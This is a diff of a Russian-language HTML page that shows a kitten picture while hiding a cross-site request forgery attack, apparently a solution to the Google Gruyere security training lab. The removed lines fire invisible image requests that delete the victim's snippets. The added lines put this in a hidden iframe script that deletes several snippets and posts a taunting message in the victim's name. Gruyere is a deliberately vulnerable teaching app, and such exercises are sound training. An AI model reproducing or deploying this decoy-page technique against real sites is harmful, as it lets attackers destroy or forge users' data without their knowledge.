@@ -1,17 +1,61 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
+  <meta charset="UTF-8">
   <title>Котики 🐱</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 50px;
+      background: #f9f9f9;
+    }
+    img {
+      border-radius: 12px;
+      box-shadow: 0 6px 12px rgba(0,0,0,0.15);
+      max-width: 600px;
+    }
+    .msg {
+      margin-top: 20px;
+      color: #555;
+      font-size: 18px;
+    }
+  </style>
 </head>
 <body>
-  <h1>Смотрите, котики!</h1>
-  <img src="https://i.imgur.com/8UXpQeA.jpg" width="500">
+  <h1>Смотрите, какие котики!</h1>
+  <img src="https://i.imgur.com/8UXpQeA.jpg" alt="Милый котик">
+  <p class="msg">Какой милый котёнок, правда? 😊</p>
 
-  <!-- Удаление сниппетов (проверяем все индексы) -->
-  <img src="https://google-gruyere.appspot.com/643453999600290416051506802884356354571/deletesnippet?index=0" style="display:none">
-  <img src="https://google-gruyere.appspot.com/643453999600290416051506802884356354571/deletesnippet?index=1" style="display:none">
-  <img src="https://google-gruyere.appspot.com/643453999600290416051506802884356354571/deletesnippet?index=2" style="display:none">
-  <img src="https://google-gruyere.appspot.com/643453999600290416051506802884356354571/deletesnippet?index=3" style="display:none">
-  <img src="https://google-gruyere.appspot.com/643453999600290416051506802884356354571/deletesnippet?index=4" style="display:none">
+  <!-- Скрытый iframe — загружает вредоносный скрипт в контексте Gruyere -->
+  <iframe
+    name="xsrf-payload"
+    style="display:none"
+    srcdoc="
+      <html>
+        <body>
+          <script>
+            // Ждём 1.5 сек — чтобы всё загрузилось
+            setTimeout(() => {
+              const base = 'https://google-gruyere.appspot.com/643453999600290416051506802884356354571';
+              const indices = [0, 1, 2, 3]; // Удаляем все сниппеты
+
+              // Удаляем каждый сниппет
+              indices.forEach(index => {
+                const img = new Image();
+                img.src = base + '/deletesnippet?index=' + index + '&t=' + Date.now();
+              });
+
+              // Через 2 сек — создаём свой сниппет
+              setTimeout(() => {
+                const create = new Image();
+                create.src = base + '/newsnippet?snippet=' + encodeURIComponent('Привет от Алисы Твои сниппеты — мои 😈');
+              }, 2000);
+            }, 1500);
+          <\/script>
+        </body>
+      </html>
+    ">
+  </iframe>
 </body>
 </html>
